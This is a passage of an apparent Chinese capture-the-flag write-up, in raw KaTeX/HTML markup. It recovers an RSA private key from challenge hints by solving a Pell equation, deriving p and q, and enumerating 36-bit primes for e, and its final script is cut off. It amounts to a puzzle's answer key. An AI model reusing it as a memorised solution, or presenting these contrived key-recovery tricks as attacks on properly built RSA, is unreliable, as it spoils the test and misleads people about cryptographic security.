mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7463142857142857em;\"><span style=\"top:-2.786em;margin-right:0.07142857142857144em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mtight\">5</span><span class=\"mord mtight\">6</span></span></span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.446108em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">p</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.345em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mclose\">⌋</span></span></span></span></p>\n</li>\n<li d.bit\\_length()4=\"\">\n<p>h_4=d\\%2^</p>\n</li>\n<li>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>h</mi><mn>5</mn></msub><mo>=</mo><msup><mi>x</mi><mn>2</mn></msup><mi>p</mi><mo>+</mo><msup><mi>y</mi><mn>2</mn></msup><mi>q</mi></mrow><annotation encoding=\"application/x-tex\">h_5=x^2p+y^2q</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.84444em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.008548em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.008548em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span></span></span></span></p>\n</li>\n</ul>\n<p>还给了 n 和 c</p>\n<p>已知<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>114514</mn><msup><mi>x</mi><mn>2</mn></msup><mo>−</mo><mn>11680542514</mn><msup><mi>y</mi><mn>2</mn></msup><mo>+</mo><mn>1919810</mn><mo>=</mo><mn>2034324</mn></mrow><annotation encoding=\"application/x-tex\">114514 x^2 - 11680542514 y^2 + 1919810 = 2034324</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.897438em;vertical-align:-0.08333em;\"></span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mord\">4</span><span class=\"mord\">5</span><span class=\"mord\">1</span><span class=\"mord\">4</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.008548em;vertical-align:-0.19444em;\"></span><span class=\"mord\">1</span><span class=\"mord\">1</span><span class=\"mord\">6</span><span class=\"mord\">8</span><span class=\"mord\">0</span><span class=\"mord\">5</span><span class=\"mord\">4</span><span class=\"mord\">2</span><span class=\"mord\">5</span><span class=\"mord\">1</span><span class=\"mord\">4</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">1</span><span class=\"mord\">9</span><span class=\"mord\">8</span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">3</span><span class=\"mord\">4</span><span class=\"mord\">3</span><span class=\"mord\">2</span><span class=\"mord\">4</span></span></span></span></p>\n<p>化简后得到<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>−</mo><mn>102001</mn><msup><mi>y</mi><mn>2</mn></msup><mo>=</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">x^2-102001y^2=1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.897438em;vertical-align:-0.08333em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.008548em;vertical-align:-0.19444em;\"></span><span class=\"mord\">1</span><span class=\"mord\">0</span><span class=\"mord\">2</span><span class=\"mord\">0</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span></p>\n<p>使用下面的脚本求得 x 和 y 的值</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solvePell</span>(<span class=\"params\">n</span>):</span><br><span class=\"line\">    x = <span class=\"built_in\">int</span>(math.sqrt(n))</span><br><span class=\"line\">    y, z, r = x, <span class=\"number\">1</span>, x &lt;&lt; <span class=\"number\">1</span></span><br><span class=\"line\">    e1, e2 = <span class=\"number\">1</span>, <span class=\"number\">0</span></span><br><span class=\"line\">    f1, f2 = <span class=\"number\">0</span>, <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        y = r * z - y</span><br><span class=\"line\">        z = (n - y * y) // z</span><br><span class=\"line\">        r = (x + y) // z</span><br><span class=\"line\"></span><br><span class=\"line\">        e1, e2 = e2, e1 + e2 * r</span><br><span class=\"line\">        f1, f2 = f2, f1 + f2 * r</span><br><span class=\"line\"></span><br><span class=\"line\">        a, b = f2 * x + e2, f2</span><br><span class=\"line\">        <span class=\"keyword\">if</span> a * a - n * b * b == <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> a, b</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> [<span class=\"number\">102001</span>]:</span><br><span class=\"line\">    x, y = solvePell(n)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;x^2 - %3d * y^2 = 1\\nx = %27d\\n y = %25d&quot;</span> % (n, x, y))</span><br></pre></td></tr></table></figure></p>\n<p>根据</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mo fence=\"true\">{</mo><mtable rowspacing=\"0.3599999999999999em\" columnalign=\"left left\" columnspacing=\"1em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><msup><mi>x</mi><mn>2</mn></msup><mi>p</mi><mo>+</mo><msup><mi>y</mi><mn>2</mn></msup><mi>q</mi><mo>=</mo><msub><mi>h</mi><mn>5</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mi>p</mi><mi>q</mi><mo>=</mo><mi>n</mi></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding=\"application/x-tex\">\\begin{cases}\nx^2p+y^2q=h_5\\\\\npq=n\n\\end{cases}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:3.0000299999999998em;vertical-align:-1.25003em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size4\">{</span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.69em;\"><span style=\"top:-3.69em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-2.25em;\"><span class=\"pstrut\" style=\"height:3.008em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.19em;\"><span></span></span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></span></p>\n<p>得到</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><msup><mi>q</mi><mn>2</mn></msup><mo>−</mo><msub><mi>h</mi><mn>5</mn></msub><mi>q</mi><mo>+</mo><mi>n</mi><msup><mi>x</mi><mn>2</mn></msup><mo>=</mo><mn>0</mn></mrow><annotation encoding=\"application/x-tex\">y^2q^2-h_5q+nx^2=0\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.0585479999999998em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">0</span></span></span></span></span></p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>q</mi><mo>=</mo><mfrac><mrow><msub><mi>h</mi><mn>5</mn></msub><mo>±</mo><msqrt><mrow><msubsup><mi>h</mi><mn>5</mn><mn>2</mn></msubsup><mo>−</mo><mn>4</mn><mi>n</mi><msup><mi>x</mi><mn>2</mn></msup><msup><mi>y</mi><mn>2</mn></msup></mrow></msqrt></mrow><mrow><mn>2</mn><msup><mi>y</mi><mn>2</mn></msup></mrow></mfrac></mrow><annotation encoding=\"application/x-tex\">q=\\frac{h_5\\pm\\sqrt{h_5^2-4nx^2y^2}}{2y^2}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">q</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.51044em;vertical-align:-0.8804400000000001em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.63em;\"><span style=\"top:-2.314em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.740108em;\"><span style=\"top:-2.9890000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.6802em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">±</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord sqrt\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9498em;\"><span class=\"svg-align\" style=\"top:-3.2em;\"><span class=\"pstrut\" style=\"height:3.2em;\"></span><span class=\"mord\" style=\"padding-left:1em;\"><span class=\"mord\"><span class=\"mord mathnormal\">h</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.7959080000000001em;\"><span style=\"top:-2.433692em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">5</span></span></span><span style=\"top:-3.0448000000000004em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.26630799999999993em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\">4</span><span class=\"mord mathnormal\">n</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.740108em;\"><span style=\"top:-2.9890000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.740108em;\"><span style=\"top:-2.9890000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span><span style=\"top:-2.9098em;\"><span class=\"pstrut\" style=\"height:3.2em;\"></span><span class=\"hide-tail\" style=\"min-width:1.02em;height:1.28em;\"><svg width='400em' height='1.28em' viewBox='0 0 400000 1296' preserveAspectRatio='xMinYMin slice'><path d='M263,681c0.7,0,18,39.7,52,119\nc34,79.3,68.167,158.7,102.5,238c34.3,79.3,51.8,119.3,52.5,120\nc340,-704.7,510.7,-1060.3,512,-1067\nl0 -0\nc4.7,-7.3,11,-11,19,-11\nH40000v40H1012.3\ns-271.3,567,-271.3,567c-38.7,80.7,-84,175,-136,283c-52,108,-89.167,185.3,-111.5,232\nc-22.3,46.7,-33.8,70.3,-34.5,71c-4.7,4.7,-12.3,7,-23,7s-12,-1,-12,-1\ns-109,-253,-109,-253c-72.7,-168,-109.3,-252,-110,-252c-10.7,8,-22,16.7,-34,26\nc-22,17.3,-33.3,26,-34,26s-26,-26,-26,-26s76,-59,76,-59s76,-60,76,-60z\nM1001 80h400000v40h-400000z'/></svg></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2902em;\"><span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8804400000000001em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></span></p>\n<p>得到的 q 有两个解，仅保留整数解，然后根据<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mo>=</mo><mfrac><mi>n</mi><mi>q</mi></mfrac></mrow><annotation encoding=\"application/x-tex\">p=\\frac nq</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1764999999999999em;vertical-align:-0.481108em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.695392em;\"><span style=\"top:-2.6550000000000002em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">q</span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.394em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.481108em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span> 得到 p</p>\n<p>现在得到了 pq, 只需要 e 就能求得私钥 d</p>\n<p>因为题目没有直接提供 e, 所以这里需要亿点点枚举</p>\n<p>已知 e 是一个 36 位的素数，枚举时使用 <code>getPrime()</code>  获得</p>\n<p>它需要满足以下条件</p>\n<ul>\n<li><code>GCD(e, (p - 1) * (q - 1)) == 1 and e &lt; (p-1)*(q-1) </code></li>\n<li><code>( reduce(lambda x, y: x * y, range(1, h1 - 1)) * e) % h1 == h2</code>  (用到 hint1 和 hint2)</li>\n<li><code>h4 == d % (2 ** (d.bit_length() // 4))</code>  (用到 hint4)</li>\n</ul>\n<p>最终代码如下</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> functools <span class=\"keyword\">import</span> reduce</span><br><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> math <span class=\"keyword\">import</span> sqrt</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\">h5 = <span 